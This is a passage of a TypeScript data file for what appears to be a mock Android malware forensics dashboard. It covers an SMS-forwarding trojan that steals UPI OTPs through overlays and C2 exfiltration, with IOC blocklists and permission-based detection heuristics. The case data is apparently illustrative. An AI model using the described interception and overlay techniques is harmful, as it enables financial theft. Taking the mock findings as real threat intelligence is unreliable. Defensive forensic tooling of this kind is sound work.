    status: "running",
    suspicious: false,
    children: [
      {
        pid: 245,
        name: "zygote64",
        ppid: 1,
        user: "root",
        status: "running",
        suspicious: false,
        children: [
          {
            pid: 3847,
            name: "com.paysafe.security.guard",
            ppid: 245,
            user: "u0_a187",
            status: "running",
            suspicious: true,
            children: [
              { pid: 3851, name: "SmsReceiverThread", ppid: 3847, user: "u0_a187", status: "running", suspicious: true },
              { pid: 3855, name: "DataExfilThread", ppid: 3847, user: "u0_a187", status: "sleeping", suspicious: true },
              { pid: 3860, name: "HeartbeatWorker", ppid: 3847, user: "u0_a187", status: "sleeping", suspicious: true },
              { pid: 3867, name: "OverlayService", ppid: 3847, user: "u0_a187", status: "running", suspicious: true },
              { pid: 3872, name: "CryptoWorker", ppid: 3847, user: "u0_a187", status: "sleeping", suspicious: true },
            ],
          },
        ],
      },
    ],
  },
];

// ---------- Syscall Timeline ----------
export const syscallTimeline = [
  { time: "08:00", open: 12, read: 8, write: 3, connect: 2, sendto: 1, recvfrom: 0 },
  { time: "08:15", open: 5, read: 15, write: 8, connect: 1, sendto: 3, recvfrom: 2 },
  { time: "08:30", open: 3, read: 10, write: 5, connect: 0, sendto: 1, recvfrom: 1 },
  { time: "09:00", open: 8, read: 22, write: 12, connect: 3, sendto: 5, recvfrom: 4 },
  { time: "09:12", open: 15, read: 45, write: 28, connect: 8, sendto: 12, recvfrom: 9 },
  { time: "09:15", open: 18, read: 52, write: 35, connect: 10, sendto: 15, recvfrom: 12 },
  { time: "09:30", open: 6, read: 18, write: 10, connect: 2, sendto: 4, recvfrom: 3 },
  { time: "10:00", open: 4, read: 12, write: 6, connect: 1, sendto: 2, recvfrom: 1 },
  { time: "10:30", open: 20, read: 60, write: 42, connect: 12, sendto: 18, recvfrom: 14 },
  { time: "11:00", open: 5, read: 14, write: 7, connect: 1, sendto: 3, recvfrom: 2 },
  { time: "12:00", open: 3, read: 8, write: 4, connect: 0, sendto: 1, recvfrom: 0 },
  { time: "14:00", open: 22, read: 68, write: 48, connect: 8, sendto: 20, recvfrom: 15 },
  { time: "15:00", open: 10, read: 30, write: 18, connect: 4, sendto: 8, recvfrom: 6 },
  { time: "16:00", open: 5, read: 12, write: 6, connect: 1, sendto: 2, recvfrom: 1 },
  { time: "18:00", open: 8, read: 20, write: 14, connect: 3, sendto: 6, recvfrom: 4 },
  { time: "18:45", open: 14, read: 35, write: 22, connect: 6, sendto: 10, recvfrom: 8 },
];

// ---------- MobSF / JADX Findings ----------
export const mobsfFindings = {
  securityScore: 15,
  totalFindings: 42,
  categories: [
    { name: "High Risk", count: 18, color: "#ff3366" },
    { name: "Medium Risk", count: 14, color: "#ffaa00" },
    { name: "Low Risk", count: 7, color: "#00d4ff" },
    { name: "Info", count: 3, color: "#666" },
  ],
  findings: [
    { severity: "high" as const, title: "SMS PDU Interception", description: "App registers high-priority SMS receiver and calls createFromPdu() to parse raw SMS data" },
    { severity: "high" as const, title: "Broadcast Abort", description: "abortBroadcast() called after SMS interception — hides messages from user" },
    { severity: "high" as const, title: "Device Admin API", description: "DevicePolicyManager used to prevent app uninstallation" },
    { severity: "high" as const, title: "Overlay Attack Vector", description: "SYSTEM_ALERT_WINDOW + AccessibilityService for credential phishing" },
    { severity: "high" as const, title: "Data Exfiltration", description: "HTTP POST requests to suspicious TLDs (.xyz, .top) with encrypted payloads" },
    { severity: "medium" as const, title: "String Obfuscation", description: "C2 URLs stored as Base64-encoded + AES-encrypted strings" },
    { severity: "medium" as const, title: "Reflection Usage", description: "java.lang.reflect used to invoke sensitive APIs dynamically" },
    { severity: "medium" as const, title: "Dynamic DEX Loading", description: "DexClassLoader loads additional code from app assets at runtime" },
    { severity: "low" as const, title: "Debug Detection", description: "isDebuggerConnected() called — basic anti-debugging" },
    { severity: "low" as const, title: "Emulator Detection", description: "Build.FINGERPRINT checked for emulator signatures" },
  ],
};

// ---------- Forensic Report ----------
export const forensicReport = {
  caseNumber: "DFIR-2025-06-0847",
  analyst: "DroidSec Forensics Lab",
  date: "2025-06-28",
  classification: "CONFIDENTIAL",

  executiveSummary: "This report documents the forensic analysis of an Android application package (APK) identified as \"PaySafe Security\" (com.paysafe.security.guard, v3.2.1). The application masquerades as a legitimate security tool but functions as a sophisticated SMS-forwarding trojan specifically designed to intercept UPI (Unified Payments Interface) one-time passwords (OTPs) and transaction alerts from Indian banking applications. The malware employs multiple advanced techniques including high-priority SMS receiver registration, overlay attacks on UPI applications (PhonePe, Google Pay, Paytm, BHIM), contact exfiltration, and anti-analysis evasion. Communication with command-and-control (C2) infrastructure was observed across multiple servers located in Russia, Hong Kong, and Romania.",

  evidence: [
    { id: "EV-001", type: "APK File", source: "User Device (Samsung SM-G991B)", hash: "a3f2e8d91b7c4e6f...", description: "Primary malware sample" },
    { id: "EV-002", type: "Network Capture", source: "Emulator (Android 11 x86_64)", hash: "b4c3d2e1f0a9b8c7...", description: "PCAP of C2 communications" },
    { id: "EV-003", type: "Runtime Logs", source: "Cuckoo Sandbox", hash: "c5d4e3f2a1b0c9d8...", description: "Logcat output during dynamic analysis" },
    { id: "EV-004", type: "SMS Database", source: "User Device", hash: "d6e5f4a3b2c1d0e9...", description: "mmssms.db with intercepted messages" },
    { id: "EV-005", type: "Memory Dump", source: "Emulator", hash: "e7f6a5b4c3d2e1f0...", description: "Process memory containing decrypted C2 URLs" },
  ],

  methodology: [
    "1. Sample acquisition and hash verification (SHA256, MD5, SHA1)",
    "2. Static analysis using JADX decompiler and APKTool",
    "3. AndroidManifest.xml inspection for permissions and receivers",
    "4. YARA rule matching against known malware signatures",
    "5. MobSF automated security scanning",
    "6. Dynamic analysis in isolated Android emulator (API 30)",
    "7. Network traffic capture and C2 communication analysis",
    "8. SMS interception behavior verification with test messages",
    "9. Overlay attack reproduction on target UPI applications",
    "10. IOC extraction and threat intelligence correlation",
  ],

  findings: [
    { id: "F-001", severity: "critical" as const, title: "SMS Interception & Forwarding", description: "The app registers a BroadcastReceiver for SMS_RECEIVED with priority 999 (maximum), ensuring it receives SMS before any other app. It parses incoming SMS for OTP patterns and UPI-related keywords, then exfiltrates matching messages to C2 servers while aborting the broadcast to hide messages from the user." },
    { id: "F-002", severity: "critical" as const, title: "UPI Credential Phishing via Overlay", description: "Upon detecting the launch of UPI apps (PhonePe, GPay, Paytm), the malware displays a pixel-perfect fake login overlay using SYSTEM_ALERT_WINDOW permission, capturing UPI PINs and credentials via AccessibilityService." },
    { id: "F-003", severity: "critical" as const, title: "C2 Communication & Data Exfiltration", description: "Stolen data is encrypted with AES-256 and transmitted to C2 servers at api-secure.payguard[.]xyz (185.234.72[.]198) via HTTPS POST. A fallback channel over HTTP exists at 91.215.85[.]167:9090." },
    { id: "F-004", severity: "high" as const, title: "Persistence Mechanisms", description: "The app ensures persistence through BOOT_COMPLETED receiver, WAKE_LOCK, foreground service, and battery optimization bypass. DevicePolicyManager is used to prevent uninstallation." },
    { id: "F-005", severity: "high" as const, title: "Anti-Analysis Evasion", description: "Multiple evasion techniques detected: ProGuard obfuscation, string encryption, reflection-based API calls, dynamic DEX loading, emulator detection, root detection, and debugger detection." },
    { id: "F-006", severity: "high" as const, title: "Contact & Device Data Theft", description: "The malware exfiltrates the entire contact list (247 records observed), device identifiers (IMEI, ANDROID_ID, serial), and installed app inventory to C2 infrastructure." },
  ],

  conclusion: "The analyzed sample 'PaySafe Security' (SHA256: a3f2e8d91b7c4e6f...) is confirmed as a malicious Android application belonging to the UPIGrabber malware family. It represents a sophisticated threat specifically targeting the Indian UPI payment ecosystem. The malware's ability to intercept OTPs, perform overlay attacks on banking apps, and maintain persistence makes it a significant risk to financial security. Immediate containment and user notification actions are recommended.",
};

// ---------- Recommendations ----------
export interface Recommendation {
  id: string;
  title: string;
  priority: "immediate" | "short-term" | "long-term";
  category: string;
  description: string;
  steps: string[];
}

export const recommendations: Recommendation[] = [
  {
    id: "REC-001",
    title: "Block C2 Infrastructure",
    priority: "immediate",
    category: "Network Defense",
    description: "Block all identified C2 domains and IP addresses at firewall and DNS level",
    steps: [
      "Add all IOC domains to DNS sinkhole/blocklist",
      "Block IP addresses 185.234.72[.]198, 103.152.118[.]44, 91.215.85[.]167, 193.233.20[.]115 at perimeter firewall",
      "Enable IDS/IPS signatures for identified network patterns",
      "Monitor for DNS queries to related TLDs (.xyz, .top) from corporate network",
    ],
  },
  {
    id: "REC-002",
    title: "Quarantine & Remove Malware",
    priority: "immediate",
    category: "Endpoint Security",
    description: "Remove the malicious APK from all affected devices",
    steps: [
      "Push MDM command to force-remove com.paysafe.security.guard",
      "Revoke device admin privilege before uninstallation",
      "Clear app data and cached credentials",
      "Factory reset severely compromised devices",
      "Scan devices with updated AV signatures",
    ],
  },
  {
    id: "REC-003",
    title: "Alert Affected Users",
    priority: "immediate",
    category: "Incident Response",
    description: "Notify users whose financial data may have been compromised",
    steps: [
      "Identify all users who installed the APK (check MDM logs, app install records)",
      "Send security advisory recommending immediate password changes",
      "Advise users to change UPI PINs for all banking apps",
      "Recommend enabling 2FA on all financial accounts",
      "Provide hotline for reporting unauthorized transactions",
    ],
  },
  {
    id: "REC-004",
    title: "Deploy Detection Rules",
    priority: "short-term",
    category: "Detection Engineering",
    description: "Deploy YARA and Sigma rules to detect variants of this malware",
    steps: [
      "Import YARA rules into MobSF/VirusTotal for automated scanning",
      "Deploy Sigma rules to SIEM for behavioral detection",
      "Create custom Snort/Suricata rules for C2 traffic patterns",
      "Enable Google Play Protect custom policy for package name patterns",
    ],
  },
  {
    id: "REC-005",
    title: "Enhance SMS Security Policies",
    priority: "short-term",
    category: "Security Policy",
    description: "Implement policies to mitigate SMS-based attacks on UPI apps",
    steps: [
      "Enforce SMS permission auditing for all installed apps via MDM",
      "Block sideloading of APKs from unknown sources on managed devices",
      "Implement SMS-based OTP alternative (push notifications, authenticator apps)",
      "Deploy network-level SMS filtering for known phishing patterns",
    ],
  },
  {
    id: "REC-006",
    title: "Implement UPI App Hardening",
    priority: "long-term",
    category: "Application Security",
    description: "Work with UPI app developers to harden against overlay and interception attacks",
    steps: [
      "Implement FLAG_SECURE on all sensitive UPI app screens",
      "Use biometric authentication instead of SMS OTPs where possible",
      "Implement runtime overlay detection in UPI applications",
      "Deploy certificate pinning for all banking API communications",
      "Implement in-app integrity verification (Play Integrity API)",
    ],
  },
  {
    id: "REC-007",
    title: "Threat Intelligence Sharing",
    priority: "long-term",
    category: "Threat Intelligence",
    description: "Share IOCs and findings with industry partners and law enforcement",
    steps: [
      "Submit malware sample to VirusTotal, MalwareBazaar, and Indian CERT",
      "Share IOCs through STIX/TAXII feeds with banking sector ISAC",
      "Report C2 infrastructure to hosting providers for takedown",
      "Coordinate with Google Play security team for variant detection",
      "File cybercrime report with local law enforcement",
    ],
  },
];

// ---------- Emulator Status ----------
export const emulatorStatus = {
  name: "Pixel_4_API_30",
  androidVersion: "11.0 (API 30)",
  architecture: "x86_64",
  status: "running",
  uptime: "2h 45m 12s",
  cpu: "42%",
  memory: "1.8 GB / 4 GB",
  storage: "3.2 GB / 16 GB",
  network: "NAT (10.0.2.15)",
  snapshot: "clean_baseline_v2",
};

// ---------- Chart Data ----------
export const riskDistribution = [
  { name: "Permissions", value: 95, fill: "#ff3366" },
  { name: "Receivers", value: 96, fill: "#ff6644" },
  { name: "Code Analysis", value: 91, fill: "#ffaa00" },
  { name: "Behavior", value: 90, fill: "#ff8833" },
  { name: "Network", value: 88, fill: "#00d4ff" },
  { name: "Obfuscation", value: 78, fill: "#8855ff" },
];

export const networkActivityData = [
  { time: "08:00", requests: 5, bytesOut: 2400, bytesIn: 1200 },
  { time: "08:15", requests: 3, bytesOut: 1800, bytesIn: 900 },
  { time: "08:30", requests: 2, bytesOut: 800, bytesIn: 400 },
  { time: "09:00", requests: 4, bytesOut: 3200, bytesIn: 1600 },
  { time: "09:12", requests: 12, bytesOut: 15800, bytesIn: 3200 },
  { time: "09:15", requests: 15, bytesOut: 22400, bytesIn: 4800 },
  { time: "09:30", requests: 4, bytesOut: 2800, bytesIn: 1200 },
  { time: "10:00", requests: 2, bytesOut: 1200, bytesIn: 600 },
  { time: "10:30", requests: 18, bytesOut: 28000, bytesIn: 6400 },
  { time: "11:00", requests: 3, bytesOut: 1600, bytesIn: 800 },
  { time: "14:00", requests: 20, bytesOut: 34200, bytesIn: 8000 },
  { time: "15:00", requests: 8, bytesOut: 6400, bytesIn: 3200 },
  { time: "18:45", requests: 10, bytesOut: 12800, bytesIn: 4800 },
];

// ---------- Permission-based Heuristic Rules ----------
export const permissionHeuristics = [
  {
    name: "SMS Triad Detection",
    severity: "critical" as const,
    condition: "RECEIVE_SMS + READ_SMS + SEND_SMS",
    description: "App requests all three SMS permissions — strong indicator of SMS interception/forwarding capability",
    triggered: true,
  },
  {
    name: "Overlay + Accessibility Combo",
    severity: "critical" as const,
    condition: "SYSTEM_ALERT_WINDOW + BIND_ACCESSIBILITY_SERVICE",
    description: "Combination enables credential phishing via overlay attacks on banking apps",
    triggered: true,
  },
  {
    name: "Boot Persistence",
    severity: "high" as const,
    condition: "RECEIVE_BOOT_COMPLETED + WAKE_LOCK + FOREGROUND_SERVICE",
    description: "App ensures continuous background execution across device reboots",
    triggered: true,
  },
  {
    name: "Surveillance Kit",
    severity: "high" as const,
    condition: "READ_CONTACTS + READ_PHONE_STATE + READ_CALL_LOG",
    description: "App has access to comprehensive personal data including contacts, device info, and call history",
    triggered: true,
  },
  {
    name: "Battery Evasion",
    severity: "medium" as const,
    condition: "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
    description: "App requests exemption from battery optimization to maintain persistent background operation",
    triggered: true,
  },
];
